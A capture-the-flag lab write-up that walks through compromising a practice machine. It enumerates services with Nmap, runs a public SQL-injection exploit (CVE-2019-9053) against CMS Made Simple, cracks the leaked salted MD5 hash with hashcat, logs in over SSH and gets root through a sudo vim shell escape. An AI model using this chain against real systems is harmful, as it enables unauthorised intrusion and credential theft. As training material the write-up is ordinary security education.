## Challenge 1

#### Initial Enum (Nmap)
```text
Starting Nmap 7.70 ( https://nmap.org ) at 2020-09-26 20:16 AEST
Nmap scan report for 10.10.122.68
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.16.84
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Infomir MAG-250 set-top box (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 2222/tcp)
HOP RTT       ADDRESS
1   59.92 ms  10.4.0.1
2   ... 3
4   315.84 ms 10.10.122.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
```

 - Summary of findings:
    - Port 21 = FTP (Anonymous login supported)
    - Port 80 = Web Server (Apache Default)
    - Port 2222 = SSH 

 - Checking online for CVE's against the versions of Apache & OpenSSH doesn't yield anything useful (at the time of writing at least).

#### Anonymous FTP
 - Connecting the FTP server using anonymous login (`anonymous` as Username and a blank Password) we see a single directory, and in that directory a single file called `ForMitch.txt`. Let's copy that file back to our host machine and look at it.
```bash
ftp TARGET_IP
cd pub
get ForMitch.txt
exit
```

 - File contents of `ForMitch.txt`:
```text
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
 - From the name of the file we can guess that a valid Username on the server might be `mitch`, but we can't say for sure.
 - From the contents of the file we find out that this user's (maybe `mitch`) password is weak, and is probably easy to crack if we get a hash of it. For now, we need to keep looking as this doesn't give us anything concrete.


#### Web Server Part 1 - Enum
 - Checking the `robots.txt` file of the web server gives us the following.
```text
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```
 - The Disallowed page `/openemr-5_0_1_3` sounds interesting, but sadly only leads to a 404.
 - We need more info, time to try and brute force the web server for other pages.

 - Using `dirsearch` we can do this super easily.
```bash
python3 dirsearch.py -u http://TARGET_IP -e html,php -x 403 -t 200
```

 - From our searching we see that `/simple` is a valid path. Going to this page takes us to a CMS Made Simple web app.
 - Scrolling down we can see the name and version of this app => `CMS Made Simple v2.2.8`.

#### Web Server Part 2 - Exploit
 - Searching `CMS Made Simple v2.2.8 CVE` on Google quickly finds us a Unauthenticated SQL injection vulnerability [Exploit DB => CVE-2019-9053](https://www.exploit-db.com/exploits/46635).

 - Downloading and running the script...
```bash
python cve-2019-9053.py -u http://TARGET_IP/simple
```

 - We get some VERY useful information:
```text
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

 - Using Kali or another tool, we can try and identify the hash. Using `hash-identifier` in Kali gives us the following:
```text
   -------------------------------------------------------------------------
 HASH: 0c01f4468bd75d7a84c7eb73846e8d96

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+]  RAdmin v2.x
[+]  NTLM
[+]  MD4
[+]  MD2
[+]  MD5(HMAC)
[+]  MD4(HMAC)
[+]  MD2(HMAC)
[+]  MD5(HMAC(Wordpress))
[+]  Haval-128
[+]  Haval-128(HMAC)
[+]  RipeMD-128
[+]  RipeMD-128(HMAC)
[+]  SNEFRU-128
[+]  SNEFRU-128(HMAC)
[+]  Tiger-128
[+]  Tiger-128(HMAC)
[+]  md5($pass.$salt)
[+]  md5($salt.$pass)
[+]  md5($salt.$pass.$salt)
[+]  md5($salt.$pass.$username)
...
```

 - Because of the hash length and because it's a Linux host, we mostly likely have MD5 Hash. Since there is a Salt as well, it's most likely one of these:
```text
[+]  md5($salt.$pass)
[+]  md5($pass.$salt)
[+]  md5($salt.$pass.$salt)
[+]  md5($salt.$pass.$username)
```
 - It's possible that it's not one of these, but we should try simplest first since it's most likely.

 - Searching example Hashes for Hashcat we can see the following at the top as they are very common:
```text
0 	MD5 	8743b52063cd84097a65d1633f5c74f5
10 	md5($pass.$salt) 	01dfae6e5d4d90d9892622325959afbe:7050461
20 	md5($salt.$pass) 	f0fda58630310a6dd91a7d8f0a4ceda2:4225637426 
```
 - We should try these two first. Remember from the text file we extracted before that the password of `mitch` is supposable very weak, so it should be easy to crack, rockyou should find it.

 - After some trial and error, we find the hash is of type `md5($salt.$pass)`. <br>Hash = `0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2`

 - Hashcat Command:
```text
.\hashcat64.exe -m 20 -a 0 -O .\toCrack\userHash.txt .\passwordLists\rockyou.txt
```

 - Hashcat output:
```text
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```
 - Meaning the password for `mitch` is `secret`.

#### SSH & Privilege Escalation
 - Now that we have a valid user, we can attempt to SSH to the box.
```bash
ssh mitch@TARGET_IP -p 2222
```

 - Nice, the login worked and we now have a basic shell. But we don't have root yet.

 - Let's see what we have permission to run as root:
```text
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

 - This is perfect, we can use [GTFOBins](https://gtfobins.github.io) to search for  `vim` and attempt to get root.

 - From GTFOBins let's try the following:
```bash
sudo vim -c ':!/bin/bash'
```
 - Perfect, we are now root. GG.

 - There is some other cool stuff to have a look at as well, such as `config.php` in the web root folder:
```text
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'bigtreeuser';
$config['db_password'] = 'password';
$config['db_name'] = 'bigtree';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Europe/Bucharest';
?>
```